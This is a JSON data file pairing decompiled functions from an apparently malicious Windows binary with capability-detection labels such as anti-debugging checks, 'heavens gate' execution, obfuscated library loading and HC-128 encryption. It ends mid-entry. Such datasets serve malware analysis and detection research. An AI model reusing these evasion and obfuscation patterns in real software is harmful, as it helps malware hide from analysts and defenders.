{
    "00404d0c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404d0c(uint *param_1)\n\n{\n    *param_1 = 0x4015f4;\n    if (param_1[2] != 0) {\n        fcn.00405403(param_1[1]);\n    }\n    return;\n}\n",
        "token_count": 66
    },
    "004042a8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004042a8(uint32_t arg_8h)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    if ((arg_8h != 0) && (in_EAX = fcn.0040428a(),  in_EAX <= arg_8h)) {\n        iVar1 = fcn.0040428a();\n        in_EAX = iVar1 + *(in_ECX + 0x14);\n        if (arg_8h < in_EAX) {\n            return CONCAT31(in_EAX >> 8, 1);\n        }\n    }\n    return in_EAX & 0xffffff00;\n}\n",
        "token_count": 155
    },
    "00404368": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404368(uint32_t arg_8h)\n\n{\n    code *pcVar1;\n    uint var_ch;\n    \n    if (arg_8h == 0) {\n        arg_8h = 0;\n    }\n    else if (0xffffffff / arg_8h == 0) {\n        fcn.004031e0(0);\n        fcn.00404f3b(&var_ch, 0x411670);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    fcn.00404ed6(arg_8h);\n    return;\n}\n",
        "token_count": 139
    },
    "00404453": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t fcn.00404453(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.004042de();\n    if (uVar1 < 2) {\n        return 1;\n    }\n    return uVar1 - 1;\n}\n",
        "token_count": 62
    },
    "004044d2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004044d2(uint arg_8h, int32_t arg_ch)\n\n{\n    uint arg_10h;\n    int32_t in_ECX;\n    \n    if ((arg_8h != '\\0') && (0xf < *(in_ECX + 0x18))) {\n        arg_10h = *(in_ECX + 4);\n        if (arg_ch != 0) {\n            fcn.00404485(in_ECX + 4, 0x10, arg_10h, arg_ch);\n        }\n        fcn.00404298(arg_10h);\n    }\n    *(in_ECX + 0x18) = 0xf;\n    fcn.00404413(arg_ch);\n    return;\n}\n",
        "token_count": 164
    },
    "004045b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid __cdecl\nfcn.004045b0(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint arg_8h_00;\n    uint arg_10h;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint32_t uVar3;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_10h;\n    uint uVar4;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00405370();\n    *(unaff_EBP + -0x10) = &var_18h;\n    *(unaff_EBP + -0x18) = extraout_ECX;\n    uVar3 = *(unaff_EBP + 8) | 0xf;\n    uVar2 = fcn.00404453();\n    *(unaff_EBP + -0x1c) = uVar2;\n    if (uVar2 < uVar3) {\n        uVar3 = *(unaff_EBP + 8);\n    }\n    else {\n        uVar2 = *(extraout_ECX + 0x18);\n        *(unaff_EBP + -0x14) = uVar2;\n        *(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) >> 1;\n        uVar1 = *(unaff_EBP + -0x14);\n        if ((uVar3 / 3 < uVar1) && (uVar2 <= *(unaff_EBP + -0x1c) - uVar1)) {\n            uVar3 = uVar1 + uVar2;\n        }\n    }\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = fcn.00404474(uVar3 + 1);\n    if (*(unaff_EBP + 0xc) != 0) {\n        uVar4 = *(unaff_EBP + 0xc);\n        arg_10h = fcn.0040428a();\n        fcn.00404485(arg_8h_00, uVar3 + 1, arg_10h, uVar4);\n    }\n    fcn.004044d2(1, 0);\n    uVar4 = *(unaff_EBP + 0xc);\n    *(extraout_ECX + 4) = arg_8h_00;\n    *(extraout_ECX + 0x18) = uVar3;\n    fcn.00404413(uVar4);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 694
    },
    "004046ca": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004046ca(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t in_ECX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    \n    uVar1 = fcn.00404453();\n    if (uVar1 < arg_8h) {\n        fcn.00404ba1();\n    }\n    if (*(in_ECX + 0x18) < arg_8h) {\n        fcn.004045b0(arg_8h, *(in_ECX + 0x14), unaff_EDI, unaff_ESI, unaff_EBP, unaff_retaddr, arg_8h, arg_ch);\n    }\n    else if ((arg_ch == '\\0') || (0xf < arg_8h)) {\n        if (arg_8h == 0) {\n            fcn.00404413(0);\n        }\n    }\n    else {\n        uVar1 = *(in_ECX + 0x14);\n        if (arg_8h < *(in_ECX + 0x14)) {\n            uVar1 = arg_8h;\n        }\n        fcn.004044d2(1, uVar1);\n    }\n    return arg_8h != 0;\n}\n",
        "token_count": 300
    },
    "0040507d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0040507d(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint arg_8h, uint arg_ch, uint noname_17, uint noname_18, uint arg_18h, uint arg_1ch, \n            uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h_3;\n    uint *var_ch_2;\n    uint var_10h_2;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    code *var_2ch;\n    uint *var_28h_2;\n    code *pcStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar *var_8h_2;\n    int32_t var_4h_2;\n    \n    var_8h_2 = &stack0xfffffffc;\n    puStack16 = &stack0xffffffc0;\n    if (var_8h_3 == 0x123) {\n        *var_ch_2 = 0x405128;\n        var_38h = 1;\n    }\n    else {\n        pcStack40 = fcn.00405154;\n        uStack36 = *0x5b5c9c ^ &fcn.0040507d::var_28h_2;\n        uStack32 = var_24h;\n        puStack28 = var_ch_2;\n        uStack24 = var_20h;\n        uStack20 = var_1ch;\n        var_4h_2 = 0;\n        var_28h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.0040507d::var_28h_2;\n        var_34h = var_8h_3;\n        var_30h = var_10h_2;\n        iVar1 = fcn.0040761a();\n        var_2ch = *(iVar1 + 0x80);\n        (*var_2ch)(*var_8h_3, &fcn.0040507d::var_34h);\n        var_38h = 0;\n        if (var_4h_2 == 0) {\n            *in_FS_OFFSET = var_28h_2;\n        }\n        else {\n            *var_28h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_28h_2;\n        }\n    }\n    return var_38h;\n}\n",
        "token_count": 724
    },
    "00405a0b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405a0b(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x5b5c9c) {\n        return;\n    }\n    *0x5d0898 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x5d089c = &arg_8h;\n    *0x5d07d8 = 0x10001;\n    *0x5d0780 = 0xc0000409;\n    *0x5d0784 = 1;\n    var_328h = *0x5b5c9c;\n    var_324h = *0x5b5ca0;\n    *0x5d078c = unaff_retaddr;\n    *0x5d0864 = in_GS;\n    *0x5d0868 = in_FS;\n    *0x5d086c = in_ES;\n    *0x5d0870 = in_DS;\n    *0x5d0874 = unaff_EDI;\n    *0x5d0878 = unaff_ESI;\n    *0x5d087c = unaff_EBX;\n    *0x5d0880 = in_EDX;\n    *0x5d0884 = in_ECX;\n    *0x5d0888 = in_EAX;\n    *0x5d088c = unaff_EBP;\n    *0x5d0890 = unaff_retaddr;\n    *0x5d0894 = in_CS;\n    *0x5d08a0 = in_SS;\n    *0x5d07d0 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.0040b4f2(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x401d2c);\n    if (*0x5d07d0 == 0) {\n        fcn.0040b4f2(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 866
    },
    "00406858": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00406858(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040761a();\n    if (0 < *(iVar1 + 0x90)) {\n        iVar1 = fcn.0040761a();\n        *(iVar1 + 0x90) = *(iVar1 + 0x90) + -1;\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "00406b20": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406b20(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    \n    *(unaff_EDI + -4) = *(unaff_EBP + -0x24);\n    fcn.004052bb(*(unaff_EBP + -0x28));\n    iVar1 = fcn.0040761a();\n    *(iVar1 + 0x88) = *(unaff_EBP + -0x2c);\n    iVar1 = fcn.0040761a();\n    *(iVar1 + 0x8c) = *(unaff_EBP + -0x30);\n    if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n        ((iVar1 = unaff_ESI[5],  iVar1 == 0x19930520 || ((iVar1 == 0x19930521 || (iVar1 == 0x19930522)))))) &&\n       ((*(unaff_EBP + -0x34) == 0 && (*(unaff_EBP + -0x1c) != 0)))) {\n        iVar1 = fcn.00405294(unaff_ESI[6]);\n        if (iVar1 != 0) {\n            fcn.004068b8(unaff_ESI);\n        }\n    }\n    return;\n}\n",
        "token_count": 380
    },
    "00408b00": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00408bf3: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00408bf8)\n// WARNING: Removing unreachable block (ram,0x00408c26)\n// WARNING: Removing unreachable block (ram,0x00408bfe)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00408b00(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004087a0(0x411b70, 0x18);\n    fcn.00407ca6(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0x5d033c != 1) {\n        *0x5d0338 = 1;\n        *0x5d0334 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar1 = fcn.004073ce(*0x5d1d4c);\n            *(unaff_EBP + -0x28) = piVar1;\n            if (piVar1 != NULL) {\n                piVar2 = fcn.004073ce(*0x5d1d48);\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x1c) = piVar1;\n                *(unaff_EBP + -0x20) = piVar2;\n                while( true ) {\n                    piVar2 = piVar2 + -1;\n                    *(unaff_EBP + -0x24) = piVar2;\n                    if (piVar2 < piVar1) break;\n                    iVar3 = fcn.004073c5();\n                    if (*piVar2 != iVar3) {\n                        if (piVar2 < piVar1) break;\n                        pcVar4 = fcn.004073ce(*piVar2);\n                        iVar3 = fcn.004073c5();\n                        *piVar2 = iVar3;\n                        (*pcVar4)();\n                        iVar3 = fcn.004073ce(*0x5d1d4c);\n                        piVar1 = fcn.004073ce(*0x5d1d48);\n                        if ((*(unaff_EBP + -0x1c) != iVar3) || (*(unaff_EBP + -0x20) != piVar1)) {\n                            *(unaff_EBP + -0x1c) = iVar3;\n                            *(unaff_EBP + -0x28) = iVar3;\n                            *(unaff_EBP + -0x20) = piVar1;\n                            *(unaff_EBP + -0x24) = piVar1;\n                            piVar2 = piVar1;\n                        }\n                        piVar1 = *(unaff_EBP + -0x28);\n                    }\n                }\n            }\n            fcn.00408a3a(0x4012c0);\n        }\n        fcn.00408a3a(0x4012c8);\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.00407bcc(8);\n    }\n    return;\n}\n",
        "token_count": 809
    },
    "0040935f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0040935f(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.00407bcc(0);\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "0040c41c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040c41c(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.004073c5();\n    var_4h = 0;\n    if (*0x5d0b38 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x402534);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if (iVar2 == 0) {\n            return 0;\n        }\n        arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x402528);\n        if (arg_8h_00 == 0) {\n            return 0;\n        }\n        *0x5d0b38 = fcn.00407353(arg_8h_00);\n        uVar3 = (*pcVar4)(iVar2, 0x402518);\n        *0x5d0b3c = fcn.00407353(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x402504);\n        *0x5d0b40 = fcn.00407353(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x4024e8);\n        *0x5d0b48 = fcn.00407353(uVar3);\n        if (*0x5d0b48 != 0) {\n            uVar3 = (*pcVar4)(iVar2, 0x4024d0);\n            *0x5d0b44 = fcn.00407353(uVar3);\n        }\n    }\n    if ((*0x5d0b44 != iVar1) && (*0x5d0b48 != iVar1)) {\n        pcVar4 = fcn.004073ce(*0x5d0b44);\n        pcVar5 = fcn.004073ce(*0x5d0b48);\n        if (((pcVar4 != NULL) && (pcVar5 != NULL)) &&\n           (((iVar2 = (*pcVar4)(),  iVar2 == 0 || (iVar2 = (*pcVar5)(iVar2, 1, &var_14h, 0xc, &var_8h),  iVar2 == 0)) ||\n            ((var_ch & 1) == 0)))) {\n            arg_10h = arg_10h | 0x200000;\n            goto code_r0x0040c55e;\n        }\n    }\n    if ((((*0x5d0b3c != iVar1) && (pcVar4 = fcn.004073ce(*0x5d0b3c),  pcVar4 != NULL)) &&\n        (var_4h = (*pcVar4)(),  var_4h != 0)) &&\n       ((*0x5d0b40 != iVar1 && (pcVar4 = fcn.004073ce(*0x5d0b40),  pcVar4 != NULL)))) {\n        var_4h = (*pcVar4)(var_4h);\n    }\ncode_r0x0040c55e:\n    pcVar4 = fcn.004073ce(*0x5d0b38);\n    if (pcVar4 == NULL) {\n        return 0;\n    }\n    uVar3 = (*pcVar4)(var_4h, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 855
    },
    "00403207": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403207(uint32_t arg_8h)\n\n{\n    fcn.004031fc();\n    if ((arg_8h & 1) != 0) {\n        fcn.00404da1();\n    }\n    return;\n}\n",
        "token_count": 58
    },
    "0040472e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040472e(uint32_t arg_8h)\n\n{\n    fcn.0040469c();\n    if ((arg_8h & 1) != 0) {\n        fcn.00404da1();\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "00404773": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404773(uint32_t arg_8h)\n\n{\n    fcn.0040474d();\n    if ((arg_8h & 1) != 0) {\n        fcn.00404da1();\n    }\n    return;\n}\n",
        "token_count": 59
    },
    "00404936": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404936(uint32_t arg_8h)\n\n{\n    fcn.0040492b();\n    if ((arg_8h & 1) != 0) {\n        fcn.00404da1();\n    }\n    return;\n}\n",
        "token_count": 59
    },
    "00404b7a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404b7a(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x4015c0;\n    fcn.0040474d();\n    if ((arg_8h & 1) != 0) {\n        fcn.00404da1();\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "00404d2f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404d2f(uint32_t arg_8h)\n\n{\n    fcn.00404d0c();\n    if ((arg_8h & 1) != 0) {\n        fcn.00404da1();\n    }\n    return;\n}\n",
        "token_count": 62
    },
    "00404d60": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404d60(uint32_t arg_8h)\n\n{\n    fcn.00404d50();\n    if ((arg_8h & 1) != 0) {\n        fcn.00404da1();\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "004066c3": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004066c3(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 4200000;\n    fcn.00404d0c();\n    if ((arg_8h & 1) != 0) {\n        fcn.00404da1();\n    }\n    return;\n}\n",
        "token_count": 80
    },
    "0040e449": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040e449(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004087a0(0x411d38, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.00406187();\n        *puVar2 = 0;\n        puVar2 = fcn.00406174();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x5d0c18)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x5d0c20;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.0040f37e(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.00406174();\n                    *puVar2 = 9;\n                    puVar2 = fcn.00406187();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.0040dd16(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.0040e51b(0x411d38);\n                goto code_r0x0040e515;\n            }\n        }\n        puVar2 = fcn.00406187();\n        *puVar2 = 0;\n        puVar2 = fcn.00406174();\n        *puVar2 = 9;\n        fcn.0040610c(0, 0, 0, 0, 0);\n    }\ncode_r0x0040e515:\n    fcn.004087e5();\n    return;\n}\n",
        "token_count": 632
    },
    "00403297": {
        "rules": [
            "64-bit execution via heavens gate/41888d14e91b4c9e83f5980fa2a0ad87"
        ],
        "decompiled_code": "\nvoid fcn.00403297(void)\n\n{\n    *0x5cfd58 = 0x6d;\n    *0x5cfd5a = 0x73;\n    *0x5cfd62 = 0x33;\n    *0x5cfd6e = 0;\n    *0x5cfd60 = 0x67;\n    *0x5cfd68 = 100;\n    *0x5cfd5e = 0x6d;\n    *0x5cfd6a = 0x6c;\n    *0x5cfd66 = 0x2e;\n    *0x5cfd6c = 0x6c;\n    *0x5cfd64 = 0x32;\n    *0x5cfd5c = 0x69;\n    (*_sym.imp.KERNEL32.dll_LoadLibraryW)(0x5cfd58);\n    return;\n}\n",
        "token_count": 210
    },
    "00403359": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403359(uint32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint var_4h;\n    \n    *arg_8h = *arg_8h ^ arg_ch;\n    return;\n}\n",
        "token_count": 54
    },
    "0040337e": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040337e(uint32_t *arg_8h, int32_t *lpBytesRead)\n\n{\n    uint32_t uVar1;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint lpOutBuffer;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = *lpBytesRead;\n    var_10h = lpBytesRead[1];\n    uVar3 = arg_8h[1];\n    var_18h = lpBytesRead[2];\n    var_ch = lpBytesRead[3];\n    uVar4 = *arg_8h;\n    var_4h = -0x3910c8e0;\n    iVar2 = -0x3910c8e0;\n    var_8h = uVar4;\n    if (*0x5cfd54 == 0x60b) {\n        (*_sym.imp.KERNEL32.dll_CallNamedPipeA)(0x401300, 0, 0, &lpOutBuffer, 0, &lpBytesRead, 0);\n        iVar2 = var_4h;\n    }\n    var_4h = 0x20;\n    do {\n        lpBytesRead = uVar4 * 0x10 + var_18h;\n        uVar1 = (uVar4 >> 5) + var_ch;\n        *0x5cf904 = 0xffcf03fc;\n        fcn.00403359(&lpBytesRead, iVar2 + uVar4);\n        *0x5cf904 = 0;\n        *0x5cf90c = 0xffffffff;\n        uVar3 = uVar3 - (uVar1 ^ lpBytesRead);\n        *0x5cf908 = 0xff6b3619;\n        fcn.0040332c(&var_8h, uVar3 * 0x10 + var_14h ^ extraout_EDX + uVar3 ^ (uVar3 >> 5) + var_10h);\n        iVar2 = extraout_EDX_00;\n        if (*0x5cfd54 != 0x93) {\n            iVar2 = extraout_EDX_00 + 0x61c88647;\n        }\n        var_4h = var_4h + -1;\n        uVar4 = var_8h;\n    } while (var_4h != 0);\n    arg_8h[1] = uVar3;\n    *arg_8h = var_8h;\n    return;\n}\n",
        "token_count": 622
    },
    "00403490": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
